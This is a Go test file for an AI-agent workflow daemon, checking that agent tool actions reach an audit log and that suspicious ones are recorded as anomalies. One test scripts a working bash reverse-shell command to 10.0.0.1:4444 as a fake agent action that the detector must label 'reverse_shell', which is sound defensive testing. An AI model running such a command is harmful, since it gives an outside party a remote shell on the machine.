package daemon

import (
	"context"
	"path/filepath"
	"testing"

	"github.com/orlandoburli/apiary/internal/config"
	"github.com/orlandoburli/apiary/internal/db"
	"github.com/orlandoburli/apiary/internal/model"
	runnerpkg "github.com/orlandoburli/apiary/internal/runner"
	"github.com/orlandoburli/apiary/internal/workflow"
)

// auditingFakeRunner returns scripted results and forwards configured AgentActions
// through the RunRequest.AuditSink so the executor's wiring is exercised.
type auditingFakeRunner struct {
	result  model.RunResult
	actions []model.AgentAction
}

func (f *auditingFakeRunner) ID() string                       { return "fake-audit" }
func (f *auditingFakeRunner) Configure(_ map[string]any) error { return nil }
func (f *auditingFakeRunner) Run(_ context.Context, req model.RunRequest) (model.RunResult, error) {
	for _, a := range f.actions {
		if req.AuditSink != nil {
			req.AuditSink(a)
		}
	}
	return f.result, nil
}

// assertEvent scans persisted execution events for an event of the given type.
func assertEvent(t *testing.T, ctx context.Context, dbc *db.Client, eventType string) {
	t.Helper()
	events, err := dbc.ListExecutionEvents(ctx, db.ExecutionEventFilter{Type: eventType, Limit: 50})
	if err != nil {
		t.Fatalf("ListExecutionEvents(%s): %v", eventType, err)
	}
	if len(events) == 0 {
		t.Errorf("expected at least one %q execution event, got none", eventType)
	}
}

func TestWfStepExecutor_AuditSink_RecordsAgentAction(t *testing.T) {
	ctx := context.Background()
	dbc, err := db.New(ctx, filepath.Join(t.TempDir(), "test.db"))
	if err != nil {
		t.Fatalf("open db: %v", err)
	}
	t.Cleanup(func() { _ = dbc.Close() })

	runner := &auditingFakeRunner{
		result: model.RunResult{Success: true, Output: "done"},
		actions: []model.AgentAction{
			{Tool: "read_file", InputSummary: `{"path": "/workspace/main.go"}`},
			{Tool: "bash", InputSummary: `{"command": "go test ./..."}`},
		},
	}

	d := &Dispatcher{
		cfg:         &config.Config{},
		db:          dbc,
		runners:     map[string]runnerpkg.Runner{"agent-analyst": runner},
		agentRunner: map[string]string{"analyst": "fake"},
	}
	x := &wfStepExecutor{d: d}

	res := x.ExecuteStep(ctx, workflow.StepRequest{
		InstanceID: "wf_audit_1",
		Cell:       model.SourceItem{ID: "c1", Title: "Audit test", Number: "#1"},
		Step:       config.StepConfig{ID: "analyze", Agent: "analyst"},
		Model:      "claude-sonnet-4-6",
	})

	if !res.Success {
		t.Fatalf("expected success, got %+v", res)
	}

	assertEvent(t, ctx, dbc, "agent.action")
}

func TestWfStepExecutor_AuditSink_RecordsAnomaly(t *testing.T) {
	ctx := context.Background()
	dbc, err := db.New(ctx, filepath.Join(t.TempDir(), "test.db"))
	if err != nil {
		t.Fatalf("open db: %v", err)
	}
	t.Cleanup(func() { _ = dbc.Close() })

	runner := &auditingFakeRunner{
		result: model.RunResult{Success: true, Output: "done"},
		actions: []model.AgentAction{
			// This is the suspicious action: bash reverse shell
			{Tool: "bash", InputSummary: `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`},
		},
	}

	d := &Dispatcher{
		cfg:         &config.Config{},
		db:          dbc,
		runners:     map[string]runnerpkg.Runner{"agent-analyst": runner},
		agentRunner: map[string]string{"analyst": "fake"},
	}
	x := &wfStepExecutor{d: d}

	x.ExecuteStep(ctx, workflow.StepRequest{
		InstanceID: "wf_audit_2",
		Cell:       model.SourceItem{ID: "c2", Title: "Anomaly test", Number: "#2"},
		Step:       config.StepConfig{ID: "analyze", Agent: "analyst"},
		Model:      "claude-sonnet-4-6",
	})

	assertEvent(t, ctx, dbc, "agent.action")
	assertEvent(t, ctx, dbc, "agent.anomaly")

	// Verify anomaly metadata
	events, _ := dbc.ListExecutionEvents(ctx, db.ExecutionEventFilter{Type: "agent.anomaly", Limit: 10})
	if len(events) == 0 {
		t.Fatal("no agent.anomaly event found")
	}
	meta := events[0].Metadata
	if meta["kind"] != "reverse_shell" {
		t.Errorf("anomaly kind = %q, want reverse_shell", meta["kind"])
	}
	if meta["tool"] != "bash" {
		t.Errorf("anomaly tool = %q, want bash", meta["tool"])
	}
}

func TestWfStepExecutor_AuditSink_NoActionNoEvent(t *testing.T) {
	ctx := context.Background()
	dbc, err := db.New(ctx, filepath.Join(t.TempDir(), "test.db"))
	if err != nil {
		t.Fatalf("open db: %v", err)
	}
	t.Cleanup(func() { _ = dbc.Close() })

	// Runner emits no actions
	runner := &auditingFakeRunner{
		result: model.RunResult{Success: true, Output: "done"},
	}

	d := &Dispatcher{
		cfg:         &config.Config{},
		db:          dbc,
		runners:     map[string]runnerpkg.Runner{"agent-analyst": runner},
		agentRunner: map[string]string{"analyst": "fake"},
	}
	x := &wfStepExecutor{d: d}

	x.ExecuteStep(ctx, workflow.StepRequest{
		InstanceID: "wf_audit_3",
		Cell:       model.SourceItem{ID: "c3", Title: "No action test", Number: "#3"},
		Step:       config.StepConfig{ID: "analyze", Agent: "analyst"},
		Model:      "claude-sonnet-4-6",
	})

	events, err := dbc.ListExecutionEvents(ctx, db.ExecutionEventFilter{Type: "agent.action", Limit: 10})
	if err != nil {
		t.Fatalf("ListExecutionEvents: %v", err)
	}
	if len(events) != 0 {
		t.Errorf("expected 0 agent.action events for no-action runner, got %d", len(events))
	}
}
